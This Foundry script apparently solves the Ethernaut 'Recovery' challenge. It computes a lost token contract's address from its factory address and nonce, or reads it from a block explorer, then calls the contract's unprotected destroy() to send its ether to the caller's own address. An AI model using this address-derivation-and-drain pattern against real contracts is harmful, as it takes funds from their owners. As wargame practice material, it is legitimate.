
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Recovery.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

// Solution 1
// Obtain address of contract using address of factory contract and nonce
contract Dev {
    function recover(address sender) external pure returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), sender, bytes1(0x01)));
        address addr = address(uint160(uint256(hash)));
        return addr;
    }
}

contract RecoverySolution is Script {

    // Solution 2:
    // Obtain address from block explorer
    SimpleToken simpleToken2 = SimpleToken(payable(0xbC4444177CF914cA3a7548b53239AC75D3CE531C));
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        // Solution 2 execute
        // simpleToken2.destroy(payable(vm.envAddress("MY_ADDRESS")));

        // Solution 1 Execute
        Dev dev = new Dev();
        address payable tokenAddress = payable(dev.recover(0x1156663f041c6bFbfF4d27F91453F402FE8f4440));
        console.log(tokenAddress); // Factory contract address
        SimpleToken simpleToken = SimpleToken(tokenAddress);
        simpleToken.destroy(payable(vm.envAddress("MY_ADDRESS")));
        vm.stopBroadcast();
    }
}